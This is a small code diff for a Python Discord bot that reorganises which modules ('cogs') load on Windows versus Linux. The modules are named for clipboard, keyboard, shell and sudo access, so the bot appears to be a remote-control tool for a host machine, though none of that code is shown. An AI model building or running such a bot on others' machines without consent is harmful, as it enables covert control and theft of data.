@@ -39,12 +39,12 @@ class MyBot(commands.Bot):
         print(f"Logged in as: {self.user}")
 
         default_cog_classes = [clipboard_cog, keyboard_cog, shell_cog, message_cog]
-        linux_cog_classes = [sudo_cog,]
-        windows_cog_classes = []
-        
+                
         if isWindows:
+            windows_cog_classes = []
             cog_classes = default_cog_classes + windows_cog_classes
         elif not isWindows:
+            linux_cog_classes = [sudo_cog,]
             cog_classes = default_cog_classes + linux_cog_classes
 
         for cog_class in cog_classes:
